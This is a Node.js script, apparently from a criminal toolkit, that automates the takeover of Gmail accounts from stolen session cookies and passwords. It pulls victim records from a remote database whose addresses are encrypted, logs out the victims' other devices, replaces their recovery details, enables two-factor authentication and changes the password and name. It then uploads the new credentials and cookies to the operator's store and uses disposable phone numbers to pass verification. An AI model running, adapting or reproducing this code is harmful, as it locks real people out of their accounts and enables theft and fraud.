const changer = require('gmail-changer')
const crypto = require('crypto')
const axios = require('axios')


const BASE_URL = decrypt('CgNuLlQfR3jlSKEMiLtTuk+/9dHkDDtfAGU5YSjvD09hm4EPNlklAb/G5lo/WBPQlXsTRx9qPkaqChXmtGsz4w==')
const DATABASE_URL = decrypt('Ho3w4e0EI9uVPoN9hhxdI4hRUNMBXjo9s8vy5IT9Wh3WhysrJlYcqaa0offkbJzez3xIVwAtUfV1argzGbiIvw==')
const NUMBER_TOKEN = decrypt('cDqLFakK9FxKMR7V4ZeWgG/OXmcaZsbJ6ifwDlXLe7wh6b063zaMVntuYXeVblhieWoKTtfKgOE5zWnXAKJDReuq0xcw43YLIFPIgm4n/k0twtKKAcouCAA6D7LNNX3Gs2ndouFhrBNG0LwaqMzS3QMlR+skD8U/ihzlMjNNvlKdqbtX2G4y80HArF6bhWsKku/cyWfgcAC/VNVws6fnNgryb7AN/ns+nMs4Vs6651DnEZyO6E09MSUASrKjhKxoq2C5CqHch46/ZQFOXftmvTq8AmIrJu87poFPuJUD8fDvp755AbSammQ0PGWaDtAfaFVJICmG7KeNvJvtpL+JN3LKTUzoKuHDH6/SXWnUTyu8XJ9TjJa9cnvW7DNnnls3Zr0nI3UM9TWj0roeValRH8lgEerM+DXFzhmXaWyQT258bbetSs0Imm1rtuGNMKp9BMJ2ZIt6dIpHmYsv4XcVcLXTElq5lOnssL2ajoZEV/ANP65AkARD9gVEydXXy7Ncy3lonvgboNMIDWG8pVJAuCEObkJkpKt3y3It60tjFy7dXh7+ssomIynxrfsTUdWv65xHANNNypWA1iYz+MwzSxuVzqXDywM8tMvRsVdLuXG5tZccmiQF30FA301h0e7Npi5QW76CI42BH3S4dzspQ2Kbc8S+ojVn+aCMS5c03QMJV5AfPal1ePrm6c/QfcgWfeYBc8dpDyvdhER0iQznqYoLr7cAx2q4MofBo8Sz1BQqZUjn+XX92H6bY+vF62wWfHf/TrnkkcBUTRoUDxxjx0M6fnOGDTgrqIYBH7/HuD9wH27bKSPz9lOCqRISCUV4rK/cCN4jNDZPpNpVBXpBLrCXY/C/S4xkJf/VpGYYYmo7fj/HtW53kEpJG2fTv80vgUBAsi/70WdG/C6c2n7YgS6p0a+PU3s6xkLdaASMAldlU5Rn9FV9ByGqWjizgnLcNSzTToL7jhRC7u6UE31HrlXpGFmkQwROLmoF3x1gk1+r0dC45SHqG/0PoLg6WazjaB7CiyJWp5V1M2mBWcAGstx21XbjeoixHxZG7L8Xc3L0JvhE9ePOEiHLqdRIGJYXJqATSF58wBDD6fvrxO8fQ6dK3wHgdE1p1MAzqFmbrCCbpsEGwAMyLg240lgsAqjLjkJZazfnVKFmXgiYQghMnXrZfBB/+YDZQ+oWrORUBMpHinlZvy0qbxHys0J6NqnEJEnIYyEcuwoyxKUtWWRFnbzkFFbKAS2G94LOI4hxxS3SoBtwGBh66c8BTe9riw+aPVJ3RobXv4TGrd7WVlLpaNtmCKnv65I6OhGG2fEM8SOAzB53emnVsDvWoAdCv3p8DrS3Iddz/1cKNVDLp9VnZdPANLR6jK50RwfZdfcXBLOEaRKajSI/w5Pon6oEh6+chtd8jqdk9DK3TnQgjzkuBL8Kdr5GhbpCdc84vhSBwlvWeMa0rapZZ9pm5U3G+Fh0lsDmN2C6YIW5vfzSxcToU4InLcWFABUMMClfa+k1NvYK3rpzUF3nphtzbSW1ixGj6uQUzTi9SHB+pfs/oXlbmCsW2eihm1CZb/h/929hm5E=')

let mFinishWork = false
let mSameNumber = 0
let mNumberList = []
let PROXY = null

let FILE_NAME = 'loginable'


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 9) {
            mFinishWork = true
        }
    } catch (error) {}
})


startServer()

async function startServer() {
    console.log('Process: ---START-SERVER---')

    let prevNumber = ''

    if (!BASE_URL || !DATABASE_URL) {
        console.log('---PROCESS-CLOSE---')
        process.exit(0)
    }

    PROXY = await getProxy()
    
    mNumberList = await fetchNumbers()

    console.log('Number Size:', mNumberList.length)
    
    while (true) {
        let data = await getGmailData()
        
        if (data && !mFinishWork) {
            try {
                process.send({ t:9, s:true })
            } catch (error) {}
            
            if (prevNumber == data.number) {
                mSameNumber++
            } else {
                mSameNumber = 0
            }
            console.log('Process: [ Receive New Data --- Time: '+getTime()+' ]')
            await loginWithCompleted(data.number, data.password, data.cookies, data.time?data.time:data.create, data.key, data.country)
            prevNumber = data.number
            try {
                process.send({ t:9, s:false })
            } catch (error) {}
        } else {
            await delay(10000)
        }
    }
}

async function loginWithCompleted(number, password, cookiesData, time, worker, country) {
    let cookies = cookiesData

    try {
        let raptToken = null
        let index = cookiesData.indexOf('||')
        if (index > 0) {
            raptToken = cookiesData.substring(0, index)
            cookies = cookiesData.substring(index+2)
        }

        if (await changer.isValidCookies(cookies) || (raptToken && raptToken.startsWith('https://'))) {
            
            console.log('Process: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
            let mMailDetails = await changer.getMailDetails(cookies, raptToken && raptToken.startsWith('https://'), null)

            let browser = await changer.launchBrowser(true)
            
            let page = await changer.getPage(browser)
            await changer.setupPage(page, cookies)

            console.log('Process: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
            
            try {
                let mData = await changer.getAccountDetails(page, raptToken, time)

                console.log('Process: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                
                let mPassword = null
                let mRapt = mData.rapt

                if (!mRapt) {
                    let mToken = await changer.waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
                    mPassword = encrypt(mToken.password)
                    mRapt = mToken.token
                    
                    if (mPassword) {
                        console.log('Process: [ Change Password: '+mPassword+' --- Time: '+getTime()+' ]')
                    }
                }

                console.log('Process: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
                
                if (mRapt) {
                    if (mMailDetails.data == null) {
                        mMailDetails = await changer.getMailDetails(null, false, page)
                    }

                    let mYear = mData.year
                    let mLoginStatus = 0
                    let recoveryNumber = null
                    let mMailYear = mMailDetails.year

                    let mNumberYear = await changer.waitForNumberYear(page)

                    let mDeviceYear = await changer.waitForDeviceLogout(page, mRapt)

                    mYear = (mNumberYear < mYear) ? mNumberYear : mYear
                    mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
                    
                    console.log('Process: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')

                    await changer.waitForRemoveRecovery(page, mRapt)

                    if (await changer.isValidRaptoken(page, mRapt)) {
                        console.log('Process: [ Valid RAPT Token --- Time: '+getTime()+' ]')
                    } else {
                        console.log('Process: [ Need New RAPT Token --- Time: '+getTime()+' ]')
                        
                        let mLoader = await changer.reLoginAccount(browser, page, mData.gmail, password, mRapt, mNumberList, PROXY, NUMBER_TOKEN, true)
                        mRapt = mLoader.rapt
                        if (mLoader.change) {
                            page = mLoader.page
                            browser = mLoader.browser
                            mLoginStatus = mLoader.status
                            recoveryNumber = mLoader.number
                            if (!mPassword || mLoader.pass) mPassword = encrypt(mLoader.pass)

                            if (mRapt) await changer.waitForRemoveRecovery(page, mRapt)
                        }
                    }

                    if (mRapt) {
                        let mRecovery = await changer.waitForRecoveryAdd(page, mRapt, [])
        
                        console.log('Process: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
                        
                        let rapt = await changer.getRapt(await page.url())

                        if (rapt) mRapt = rapt

                        let mTwoFa = await changer.waitForTwoFaActive(page, mRapt)
            
                        console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')

                        if (!mPassword) mPassword = encrypt(await changer.waitForPasswordChange(page, mRapt))

                        if(mPassword) {
                            let n_cookies = await changer.getNewCookies(await page.cookies())
                            
                            try {
                                await axios.patch(DATABASE_URL+'gmail/'+(country?country+'/':'')+'completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                                    headers: {
                                        'Content-Type': 'application/x-www-form-urlencoded'
                                    }
                                })
                            } catch (error) {
                                console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
                            }
            
                            console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
                            
                            await changer.waitForLanguageChange(page)
            
                            console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
            
                            await changer.waitForSkipPassword(page, mRapt)
            
                            console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
            
                            await changer.waitForNameChange(page, mRapt, await getName())

                            console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                        } else {
                            try {
                                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
                                    headers: {
                                        'Content-Type': 'application/x-www-form-urlencoded'
                                    }
                                })
                            } catch (error) {
                                console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
                            }
                            
                            console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
                            await axios.delete(BASE_URL+FILE_NAME+'/'+number+'.json')
                            mSameNumber = 0
                        }
                    } else {
                        try {
                            await axios.patch(BASE_URL+(mLoginStatus==200?'error_login':'error_rapt')+'/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                }
                            })
                        } catch (error) {
                            console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
                        }
                        
                        console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
                        await axios.delete(BASE_URL+FILE_NAME+'/'+number+'.json')
                        mSameNumber = 0
                    }
                } else {
                    let n_cookies = await changer.getNewCookies(await page.cookies())
                    
                    try {
                        await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: time }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {
                        console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
                    }
                }

                try {
                    await axios.delete(BASE_URL+FILE_NAME+'/'+number+'.json')
                } catch (error) {}
            } catch (error) {
                console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
            }
            
            await changer.closePage(page)
            await changer.closeBrowser(browser)
        } else {
            console.log('Process: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')

            try {
                await axios.patch(BASE_URL+'expire/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {
                console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
            }

            await axios.delete(BASE_URL+FILE_NAME+'/'+number+'.json')
        }
    } catch (error) {
        console.log('Process: [ Main Process: Error --- Time: '+getTime()+' ]')
    }

    try {
        if (mSameNumber > 2) {
            try {
                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {
                console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
            }
            console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
            await axios.delete(BASE_URL+FILE_NAME+'/'+number+'.json')
            mSameNumber = 0
        }
    } catch (error) {}
}


async function fetchNumbers() {
    let allNumbers = []

    for (let page = 1; page <= 3; page++) {
        try {
            let response = await axios.post('https://sever1.tempxapi.com/api/numbers', { countryName: 'United States', limit: 20, page: page }, {
                proxy: PROXY,
                headers: {
                    'Host': 'sever1.tempxapi.com',
                    'X-Platform': 'Android',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'User-Agent': 'okhttp/4.9.2'
                }
            })

            let numbers = response.data.available_numbers.map(num => ({
                number: num.ToNumber.replace('+', ''),
                page: page
            }))

            allNumbers.push(...numbers)
        } catch (err) {}
    }

    return allNumbers
}

async function getProxy() {
    try {
        let response = await axios.get(DATABASE_URL+'proxy/01.json')
        return response.data
    } catch (error) {}

    return null
}

async function getName() {
    for (let i = 0; i < 3; i++) {
        try {
            let response = await axios.get(DATABASE_URL+'name/english/male/'+getRandomInt(0, 94929)+'.json')
            if (response.data) {
                return response.data
            }
        } catch (error) {}
    }
}

async function getGmailData() {

    try {
        let response = await axios.get(BASE_URL+FILE_NAME+'.json?orderBy=%22$key%22&limitToFirst=1')
        let data = response.data
        if (data) {
            let number = Object.keys(data)[0]
            let value = data[number]
            value['number'] = number
            return value
        }
    } catch (error) {}

    return null
}

function decrypt(text) {
    try {
        let argv = process.argv.slice(2)
        if (argv.length < 3) {
            return null
        }
        let key = Buffer.from(argv[1], 'base64')
        let iv  = Buffer.from(argv[2], 'base64')
        let cipher = crypto.createDecipheriv('aes-192-cbc', key, iv)
        return cipher.update(text, 'base64', 'utf8') + cipher.final('utf8')
    } catch (e) {
        return null
    }
}

function encrypt(text) {
    try {
        if (!text) {
            return null
        }

        let argv = process.argv.slice(2)
        if (argv.length < 3) {
            return text
        }
        let key = Buffer.from(argv[1], 'base64')
        let iv  = Buffer.from(argv[2], 'base64')
        let cipher = crypto.createCipheriv('aes-192-cbc', key, iv)
        return cipher.update(text, 'utf8', 'base64') + cipher.final('base64')
    } catch (e) {
        return text
    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function getTime() {
    return new Date().toLocaleTimeString('en-us', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(',', '')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
